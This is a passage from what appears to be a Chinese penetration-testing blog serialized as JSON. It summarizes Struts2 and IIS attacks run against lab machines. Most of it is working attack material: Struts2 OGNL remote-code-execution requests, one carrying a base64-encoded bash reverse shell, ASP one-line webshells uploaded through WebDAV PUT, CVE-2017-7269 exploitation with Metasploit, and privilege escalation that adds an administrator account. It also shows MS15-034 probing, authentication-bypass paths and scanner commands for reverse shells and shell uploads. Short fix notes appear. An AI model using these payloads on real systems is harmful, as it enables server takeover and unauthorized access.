name=\"id\"\n\n%{(#instancemanager=#application[\"org.apache.tomcat.InstanceManager\"]).(#stack=#attr[\"com.opensymphony.xwork2.util.ValueStack.ValueStack\"]).(#bean=#instancemanager.newInstance(\"org.apache.commons.collections.BeanMap\")).(#bean.setBean(#stack)).(#context=#bean.get(\"context\")).(#bean.setBean(#context)).(#macc=#bean.get(\"memberAccess\")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(\"java.util.HashSet\")).(#bean.put(\"excludedClasses\",#emptyset)).(#bean.put(\"excludedPackageNames\",#emptyset)).(#arglist=#instancemanager.newInstance(\"java.util.ArrayList\")).(#arglist.add(\"id\")).(#execute=#instancemanager.newInstance(\"freemarker.template.utility.Execute\")).(#execute.exec(#arglist))}\n------WebKitFormBoundaryl7d1B1aGsV2wcZwF--\n\n```\n\n\n\n![image-20210519151454205](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210519151454205.png)\n\n\n\n#### Poc-2-反弹shell\n\n```\nbash -i >& /dev/tcp/192.168.175.130/8888 0>&1\n```\n\n一样需要转码\n\n```\nbash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NS4xMzAvODg4OCAwPiYx}|{base64,-d}|{bash,-i}\n```\n\n\n\n\n\n![image-20210519151403831](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210519151403831.png)\n\n\n\n进行执行\n\n\n\n![image-20210519151603163](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210519151603163.png)\n\n\n\n\n\n```\nPOST /index.action HTTP/1.1\nHost: 192.168.175.130:8080\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36\nConnection: close\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF\nContent-Length: 924\n\n------WebKitFormBoundaryl7d1B1aGsV2wcZwF\nContent-Disposition: form-data; name=\"id\"\n\n%{(#instancemanager=#application[\"org.apache.tomcat.InstanceManager\"]).(#stack=#attr[\"com.opensymphony.xwork2.util.ValueStack.ValueStack\"]).(#bean=#instancemanager.newInstance(\"org.apache.commons.collections.BeanMap\")).(#bean.setBean(#stack)).(#context=#bean.get(\"context\")).(#bean.setBean(#context)).(#macc=#bean.get(\"memberAccess\")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(\"java.util.HashSet\")).(#bean.put(\"excludedClasses\",#emptyset)).(#bean.put(\"excludedPackageNames\",#emptyset)).(#arglist=#instancemanager.newInstance(\"java.util.ArrayList\")).(#arglist.add(\"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NS4xMzAvODg4OCAwPiYx}|{base64,-d}|{bash,-i}\")).(#execute=#instancemanager.newInstance(\"freemarker.template.utility.Execute\")).(#execute.exec(#arglist))}\n------WebKitFormBoundaryl7d1B1aGsV2wcZwF--\n\n```\n\n\n\n成功上线\n\n\n\n![image-20210519151634344](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210519151634344.png)\n\n\n\n### S2-devMode远程执行代码漏洞\n\n#### 影响版本\n\n```\n当Struts开启devMode时，该漏洞将影响Struts 2.1.0-2.5.1，通杀Struts2所有版本\n```\n\n#### 漏洞搭建\n\n```\ndocker pull medicean/vulapps:s_struts2_s2-devmode #拉取漏洞\nsudo docker run -d -p 8888:8080 medicean/vulapps:s_struts2_s2-devmode #映射到本地8888端口\nsudo docker ps #查看\n```\n\n\n\n![image-20210519162406558](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210519162406558.png)\n\n\n\n#### 漏洞复现\n\n访问一下\n\n```\nhttp://192.168.175.130:8888/orders\n```\n\n\n\n\n\n![image-20210519162456836](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210519162456836.png)\n\n#### 漏洞验证\n\n\n\n进行抓包\n\n```\n/orders/new/?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context[%23parameters.rpsobj[0]].getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()))):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=123456789&command=id\n```\n\n\n\n![image-20210519162658218](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210519162658218.png)\n\n## 自动化武器\n\n### K8\n\n![image-20210520002348581](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210520002348581.png)\n\n\n\n\n\n### Struts2-安恒检测\n\n\n\n![image-20210520002432879](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210520002432879.png)\n\n\n\n### Strut2Scan\n\n\n\n![image-20210520003143362](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210520003143362.png)\n\n\n\n![image-20210520003000950](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210520003000950.png)\n\n\n\n```\n# 单个URL检测\npython3 Struts2Scan.py -u http://192.168.175.130:8080/\n\n# 批量漏洞检测\npython3 Struts2Scan.py -f urls.txt\n\n# POST数据检测\npython3 Struts2Scan.py -u http://192.168.175.130:8080/ -d name=admin&email=admin&age={exp}\n\n# 漏洞利用\n\n# 命令执行：\n$ python3 Struts2Scan.py -u http://192.168.175.130:8080/ -n S2-016 --exec\n\n# 反弹shell\n$ python3 Struts2Scan.py -u http://192.168.175.130:8080/ -n S2-016 --reverse 192.168.100.8:8888\n\n# 上传shell\n$ python3 Struts2Scan.py -u http://192.168.175.130:8080/ -n S2-016 --upfile shell.jsp --uppath /usr/local/tomcat/webapps/ROOT/shell.jsp\n```\n\n\n\n### struts2-scan\n\n![image-20210520003129106](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210520003129106.png)\n\n\n\n```\nstruts-scan.exe http://192.168.175.130:8080/\n```\n\n\n\n### Struts2终极武器\n\n\n\n![image-20210520003234414](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210520003234414.png)\n\n\n\n### Vulmap（推荐这个）\n\n安装\n\n```\n# 拉取\ngit clone https://github.com/zhzyker/vulmap.git\n# 安装依赖\npip3 install -r requirements.txt\n# 执行：Linux & MacOS & Windows\npython3 vulmap.py -u http://example.com\n```\n\n\n\n使用\n\n\n\n```\n# 测试所有漏洞的Poc 不指定-a 默认开启指纹识别\npython3 vulmap.py -u http://example.com\n\n# 检查站点是否存在struts2漏洞\npython3 vulmap.py -u http://example.com -a struts2\n\n# 进行漏洞利用：WebLogic 的CVE-2019-2729 \npython3 vulmap.py -u http://example.com:7001 -v CVE-2019-2729\npython3 vulmap.py -u http://example.com:7001 -m exp -v CVE-2019-2729\n\n# 批量扫描list.txt 中的 url\npython3 vulmap.py -f list.txt\n\n# 扫描结果导出到result.json\npython3 vulmap.py -u http://example.com:7001 --output-json result.json\n\n# 调用fofa api批量扫描\npython3 vulmap.py --fofa app=Apache-Shiro  \n这里可以去修改vulmap.py文件 添加fofa邮箱andkey\n```\n\n","tags":["Struts2总结"],"categories":["服务攻防"]},{"title":"IIS总结","url":"/2021/04/28/IIS/","content":"\n**IIS**\n\n<!--more-->\n\n\n\n# 安装IIS6\n\n这边在Windows Server 2003上安装\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210419203534647.png)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210419203550907.png)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210419203625404.png)\n\nIIS 6.X 安装是需要插件的\n\n安装完成了\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2021041920394431.png)\n\n打开就是这样\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210419204156932.png)\n\n\n\n# 安装IIS7\n\nIIS7-win7-x64\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210419205319689.png)\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210419205443191.png)\n\n# IIS 6.X渗透\n\n## 0x01 IIS写权限漏洞\n\n#### 实操\n开启WebDAV引起的IIS写权限漏洞（攻击者可以上传文件）\n\nPUT任意上传漏洞！\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210419204344870.png)\n\n\n\n开启脚本资源访问和写入：\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210419204505486.png)\n\n尝试写一个html文件\n\n```\n<center><h1>this is ASP a001 hello</center><h1><%eval request(\"a001\")%>\n```\n\nIIS7远程访问一下\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2021041920491958.png)\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210419211149191.png)\n\n这边用一个工具\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210419214747665.png)\n\n添加对端IP和端口\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210419214819595.png)\n\n\n看到是可以写入的\n\n打开Windows Server 2003上默认网站对用户的权限\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210419220138851.png)\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210419220759356.png)\n\n\n写入一句话木马\n\n```c\n<%eval request(\"a\")%>\n```\n\n利用一个的`.exe`文件  进行PUT上传\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210419220845103.png)\n\n\n可以看到成功了\n\n去Windows Server 2003上看一下 刷新一下\n\n\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210419220909777.png)\n\n\n\n可以看到上传成功了\n\n这里说明一下\n\n成功通过PUT方法上传了一个含有`asp`的一句话木马的txt文件\n\n之所以不直接上传一个asp一句话是因为通常上传txt文本不会出错，但是上传asp就会报错\n\n这个时候经过修改一下就可以了\n\n这里要去Windows Server 2003开启IIS的asp解析功能\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210419222035267.png)\n\n然后把刚才上传上去的1.txt文件改名为shell.asp\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210419222246923.png)\n\n然后访问，拿蚁剑连接就可以了\n\n![-](https://img-blog.csdnimg.cn/20210419222346964.png)\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210419222438344.png)\n#### 防御\n1.关闭 WebDav\n2.关闭写入权限\n\n## 0x02 解析漏洞\n\n### IIS文件解析漏洞\n\n#### 原理\n\nIIS文件解析漏洞：`*.asp;.xxx`像这样畸形的文件IIS只会把他当作xxx.asp文件执行不会看分号之后的内容。\n\n\n#### 实操\n\nIIS文件解析漏洞\n\n首先在Windows Server 2003上创建一个a001.asp\n\n```c\n<%=time()%>  会显示当前的时间\n```\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210419222719562.png)\n\n同样也是要开启IIS的asp解析功能\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210419222035267.png)\n\n远程访问一下\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210419223437566.png)\n\n然后开始分析\n\n`a001.asp;.jpg`-->实际访问的是`a001.asp`\n\n`a001.asp;.zip`-->实际访问的是`a001.zip`\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210419223815843.png)\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210419223749142.png)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210419223800836.png)\n\n这个时候 当我们将这个内容改成asp的一句话木马时\n\n访问一下\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210419224412315.png)\n\n拿蚁剑连接一下 是可以的\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210419224429122.png)\n\n### IIS目录解析漏洞\n\n#### 原理\n\nIIS目录解析漏洞：以`*.asp`命名的文件夹中的文件都会被当作asp文件执行\n\n创建一个1.asp目录\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210419225717659.png)\n\n把之前的1.txt复制进来\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210419225739769.png)\n\n\n\n访问一下\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210419225638291.png)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210419225657973.png)\n\n#### 防御\n- 设置权限无\n![在这里插入图片描述](https://img-blog.csdnimg.cn/202104210658587.png)\n\n- 不允许新建目录。\n- 上传的文件需经过重命名（时问戳+随机数+jpg等）\n\n## 0x03 IIS短文件漏洞\n\n### 简介\n攻击者可以利用`~`字符猜解或遍历服务器中的文件名，或对IIS服务器中的 Net framework进行拒绝服务攻击！\n\n就是存在文件枚举漏洞，攻击者可利用此漏洞枚举网络服务器根目录中的文件\n\n我们到IIS目录下 去看一下\n\n```c\ndir /x\n```\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210420171101419.png)\n### IIS短文件名产生\n- 当后缀小于4时，短文件名产生需要文件（夹）名前缀字符长度大于等于9位\n- 当后缀大于等于4时，文件名前缀字符长度即使为1，也会产生短文件名\n\n目前IIS支持短文件名猜测的HTTP方法主要包括：DEBUG、OPTIONS、GET、POST、HEAD、TRACE六种\n\nIIS8.0之后的版本只能通过 OPTIONS和 TRACE方法被猜测成功\n\n### 实操\nIIS8.0以下版本需要开启 ASP.NET支持，IIS大于等于8.0版本，即使没有安装 ASP.NET，通过OPTIONS和 TRACE方法也可以猜解成功\n\n需要安装一下ASP.NET\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210420171424702.png)\n\n\n\n然后就多了这么一个东西\n\n\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210420171811661.png)\n新建一个`.aspx`的文件\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210420171930491.png)\n\n\n可以看到它也是存在的\n\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210420172013848.png)\n\n正常情况下 我们远程访问一下 \n\n它的返回是404\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210420172206900.png)\n\n或者是400的错误\n\n用一个工具去爆破它\n\n具体看这里\n\nhttps://github.com/WebBreacher/tilde_enum\nhttps://github.com/irsdl/IIS-ShortName-Scanner\n\n安装java7\n\n启动就是这样\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210420173003592.png)\n需要输入对端的IP\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210420173126959.png)\n\n这里选no\n\n然后一路回车就好了\n\n它就爆破出来了\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210420173240954.png)\n### 修复建议\n#### 1.从CMD命令关闭NTFS8.3文件格式的支持\n```c\nWindows server2003：（1代表关闭，0代表开启\n关闭该功能\n\nfsutil behavior set disable8dot3 1\n```\n\n```c\nWindows server 2008 R2：\n查询是否开启短文件名功能：fsutil 8dot3name query\n\n关闭该功能：fsutil 8dot3name set 1\n\n不同系统关闭命令稍有区别，该功能默认是开启的\n```\n\n#### 2.从修改注册表关闭NTFS 8.3文件格式的支持\n\n快捷键Win+R打开命令窗口，输入 regedit打开注册表窗口\n\n找到路径\n\n```c\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\FileSystem\n```\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210421071306721.png)\n将其中的 NtfsDisable8dot3NameCreation这一项的值设为1，1代表不创建短文件名格式\n\n#### 注意\n以上两种方式修改完成后，均需要重启系统生效。\n**此方法只能禁止NTFS 8.3格式文件名创建，已经存在的文件的短文件名无法移除，需要重新复制才会消失**\n\n### 实战用处\n- 猜后台。\n- 猜敏感文件，例如备份的`rar`、`zip`、`.bαk`、`.SQL`文件等。\n- 在某些情形下，甚至可以通过短文件名直接下载对应的文件。比如下载备份SQL文件。\n\n### IIS短文件漏洞局限性\n- 如果文件名本身太短也是无法猜解的\n- 此漏洞只能确定前6个字符，如果后面的字符太长、包含特殊字符，很难猜解\n- 如果文件名前6位带空格，8.3格式的短文件名会补进，和真实文件名不匹配\n- 如果文件夹名前6位字符带点`.`，扫描程序会认为是文件而不是文件夹，最终出现误报\n- 不支持中文文件名，包括中文文件和中文文件夹。一个中文相当于两个英文字符，故超过4个中文字会产生短文件名，但是IIS不支持中文猜测\n\n## 0x04 RCE-CVE-2017-7269\n\n### 简介\nMicrosoft windows Server 2003 R2中的 Interne信息服务IIS6.0中的 WebDAV服务中的ScStoragePathFromUrl函数中的缓冲区溢出允许远程攻击者通过以`If:<http://`开头的长标头执行任意代码 PROPFIND请求\n\n### 影响范围：\nWiNdows Server 2003 R2上使用IIS6.0并开启 WebDAV扩展。\n\n复现一下这个漏洞\n\n根据需求进行设置\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210420173539422.png)\n\n然后在Win7 远程打一下Windows Server 2003\n\nExp地址\n\nhttps://github.com/edwardz246003/IIS_exploit/blob/master/exploit.py\n\nExp是基于python2的\n\n修改一下\n\n对端IP和端口\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210420173855222.png)\n\n执行一下\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210420173933357.png)\n\n\n去看看Win7的进程\n\n多了`calc.exe`这样一个进程\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210420174111203.png)\n\n证明是存在缓冲区溢出的\n\n### 漏洞修复\n- 关闭 WebDav服务\n- 使用相关防护设备\n\n### 实战中的应用\n\n条件：IIS 6.0 开启WebDav\n\n接下来演示\n\nexp：\n\n```c\nhttps://github.com/zcgonvh/cve-2017-7269\n```\n\n下载后注意一点 进行更名一下\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210420174824230.png)\n然后我们把这个`.rb`文件放入MSF的渗透框架中\n\n/usr/share/metasploit-framework/modules/exploits/windows/iis/\n\n然后执行cp命令即可\n\n```c\ncp /root/Desktop/cve_2017_7269.rb .\n```\n\n启动MSF\n\n使用这个模块\n\n```c\nuse exploit/windows/iis/cve_2017_7269\n```\n\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210420175817649.png)\n\n\n但是并没有拿到shell\n\n进行排错一下\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2021042017575348.png)\n\n\n在IP地址中未分配，可以解释为非默认绑定\n\n**注意：该exp只适用默认绑定和默认路径的情况才可以提权！**\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210420175859782.png)\n\n这里 做不做都是可以的\n\n就是批量检测进程溢出\n\n这里有个工具\n\n```c\nhttps://github.com/admintony/Windows-Exploit/tree/master/IIS6_WebDAV_Scanner\n```\n\n```c\npython IIS6_WebDAV_Scanner.py -p 1.txt\n```\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210421081103207.png)\n得到溢出值是19\n\n然后设置MSF中的PhysicalPathLength为19\n\nMSF 重新跑一下\n\n成功拿到了shell\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2021042019273069.png)\n\n\n\n简单看一下权限\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210420193035852.png)\n\n\n\n是真的 好低哇\n\n这里用到一个提权工具 \n\n针对缓冲区溢出的一个工具 挺老的\n\n进行上传\n\n```c\nupload '/root/Desktop/pr.exe'  c:\\Windows\\system32\\inetsrv\n```\n然后进行创建用户\n\n```c\npr.exe \"net user a002 963852 /add\"\n```\n\n添加到管理员组\n\n```c\npr.exe \"net localgroup administrators a002 /add\n```\n\n# IIS7.x渗透\n\n## 0x01 解析漏洞\n\n#### 原理\n\nIIS7.x版本在Fast-CGl运行模式下，在任意文件，例：a001.jpg/png后面加上/php，会将a001.jpg/png解析为php文件\n\n修复建议：配置 cgi fix_pathinfo（php inil中）为0并重启php-cgi程序\n\n我这边在Windows Server 2008 R2上进行搞\n\n\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210420200103496.png)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210420212942627.png)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210420213012789.png)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210420213052813.png)\n\n安装成功后 打开\n\nIIS7是有一个默认网站的\n\n本地访问一下 ok\n\n 这就成功了\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210420213347434.png)\n\n确定版本\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210420220352284.png)\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210420220412341.png)\n\n确认是IIS7.5的版本\n\n\n\n\n然后这边我用phpstudy进行联动\n\n切换版本\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210420215553168.png)\n报了个错 说找不到\n\n把这个文件扩展名 打开\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210420215800622.png)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210420220147508.png)\n\nGoogle的解决方案是说 因为phpstudy安装在了C盘目录下\n\n所以启动要拿管理员启动\n\n切换成功\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210420220309776.png)\n\n查看网站的基本信息\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210420220615700.png)\n\n默认端口是8980\n\n那就访问一下phpstudy网站目录下的东西吧\n\n访问康康哇\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/202104202208348.png)\n\n成功访问\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2021042022090097.png)\n\n如果你没有用phpstudy的话\n\n那么就要手动添加\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210420221109849.png)\n\n右键添加 选择php安装目录下的的`php-cgi.exe`的文件 就可以了 \n\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210420221125115.png)\n\n强调一下\n\n这个勾要打上\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210420221249468.png)\n\n把Windows Server 2008 R2的防火墙关闭一下\n\n然后远程访问一下 \n\n中间端口打错了 \n\n\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210420222250761.png)\n\n\n解析漏洞\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210420223553997.png)\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210420223003226.png)\n\n我们访问一下\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210420223026843.png)\n\n发现是不可以的\n\n解析漏洞来了\n\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210420223135450.png)\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210420223156123.png)\n\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210420223213733.png)\n\n把这个对勾去了就可以了\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2021042022323518.png)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210420223726957.png)\n\n\n成功解析为`.php`文件\n\nWebDAV在IIS7.5  在这里![在这里插入图片描述](https://img-blog.csdnimg.cn/20210420223923728.png)![在这里插入图片描述](https://img-blog.csdnimg.cn/2021042022393652.png)\n\n\n\n#### 修复建议\n\n配置 `cgi.fix_pathinfo(php.ini中)`为0并重启php-cgi程序\n\n## 0x02 HTTP.SYS远程代码执行(MS15-034)\n\nHTTP.SYS是Microsoft Windows处理HTTP请求的内核驱动程序，为了优化IIS服务器性能，从IIS6.0引入，IIS服务进程依赖HTTP.SYS\n\nHTTP.SYS远程代码执行漏洞实质是HTTP.SYS的整数溢出漏洞，当攻击者向受影响的Windows系统发送特殊设计的HTTP 请求，HTTP.sys 未正确分析时就会导致此漏洞，成功利用此漏洞的攻击者可以在系统帐户的上下文中执行任意代码。\n\n主要存在Windows+IIS的环境下，任何安装了微软IIS 6.0以上的Windows Server 2008 R2/Server 2012/Server 2012 R2以及Windows 7/8/8.1操作系统都受到这个漏洞的影响验证这个漏洞\n\n### 影响范围\n\nWindows7、Windows server 2008 R2、Windows8、Windows server2012、Windows8.1和\nWindows server 2012 R2\n\n### 漏洞影响版本\n\nIIS7.5、IIS8.0、IIS8.5\n\n### 漏洞复现\n\n\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210420225200570.png)\n\n竟然304了\n\n这里说一下304这个状态码\n\n304状态码或许不应该认为是一种错误，而是对客户端有缓存情况下服务端的一种响应\n\n直接Ctrl+F5强制刷新就可以了\n\nok  正常了 拿到了200的状态码\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210420225313347.png)\nJS前端的修改进行验证\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210420225344643.png)\n添加这段内容进行验证\n\n```C\nRange: bytes=0-18446744073709551615\n```\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210420225420587.png)\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210420225511491.png)\n\n返回码状态为416 Requested Range Not Satisfiable\n\n则存在 HTTP.SYS远程代码执行漏洞\n\n漏洞影响版本：IIS6.0，IIS7.5\n\n### 修复建议\n安装修复补丁(KB3042553)\n\n## 0x03 认证绕过漏洞\n\n### 简介\nMicrosof IIS是 Microsoft windows系统默认自带的Web服务器软件，其中默认包含FTP服务。Microsof IIS中存在认证绕过漏洞和源码泄露漏洞，该漏洞源于对用户提供的输入未经正确的验证。攻击者可利用这些漏洞在服务器进程上下文中获取密码保护资源和查看源代码文件的未授权访问，且有助于进一步攻击。\n\n### 漏洞影响版本\n\nIIS6.0、IIS7.5\n\n### 漏洞原因\nMicrosof IIS由于无法正确清理用户提供的输入，容易岀现身份验证绕过漏洞和源代码泄露漏洞。\n\n主要包括以下三类绕过\n\n（1）安装了PHP的Microsof IIS6.0身份验证绕过\n\nIIS/6.0加载受保护（如：admin）目录中的PHP文件需要用户认证信息（用户名和密码访问），如果将“`∷$INDEX_ALLOCATION`”后缀附加到目录名称后面，存在绕过认证并可能访问管理文件等特殊情况，导致IIS服务器重要信息泄露:\n\n```c\n/admin::$INDEX_ALLOCATION/index.php\n```\n\n（2）Microsof IIS7.5经典ASP身份验证绕过\n\n配置了经典ASP和 .NET Framework 4.0的Microsof IIS7.5，通过将`:i30:I\nNDEX_ALLOCATION`后缀附加到需要认证的请求目录名称后面，可以绕过经典的ASP文件访问限制\n\n```c\n/admin:$i30:$INDEX_ALLOCATION/index.asp\n```\n\n（3）Microsof IIS7.5 .NET源代码公开和身份验证绕过\n\n在配置中安装了PHP的Microsof IIS7.5，存在认证绕过漏洞；\n\n```c\nhttp://<victimIIS75>/admin:$i30:$INDEX_ALLOCATION/admin.php\n```\n\n### 演示一下第三个\n\n.NAT版本需要是4以上\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210421062847634.png)\n\n\n\n网站目录在这里\n\n\n\n搞个文件夹 丢个index.php\n\n\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210421063401203.png)\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210421063455662.png)\n\n\n\n当我们把这个匿名身份验证禁用\n\n\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210421063526720.png)\n\n\n\n访问一下\n\n\n\n就变成401的未授权了\n\n\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210421063602892.png)\n\n\n\n然后我们进行绕过\n\n\n\n```c\nhttp://IP/a001:$i30:$INDEX_ALLOCATION/index.php\n```\n\n## 0x04 解析漏洞+认证绕过漏洞\n\n目标站点限制上传和访问php文件\n\n可以利用上传aspx（.net支持解析的文件类型）文件逃避限制，将其当做php代码执行\n\n网站目录下有一个 `index.aspx`的文件，里面写有php代码\n\n在这里插入图片描述\n\n认证漏洞绕过访问 index.aspx文件，页面返回乱码，未执行 phpinfo代码！\n\n```c\nhttp://IP/a001:$i30:$INDEX_ALLOCATION/index.aspx\n```\n\n这里我们在加上解析漏洞\n\n```c\nhttp://IP/a001:$i30:$INDEX_ALLOCATION/index.aspx/.php\n```\n\n在这里插入图片描述\n\n成功执行","tags":["IIS总结"],"categories":["服务攻防"]}]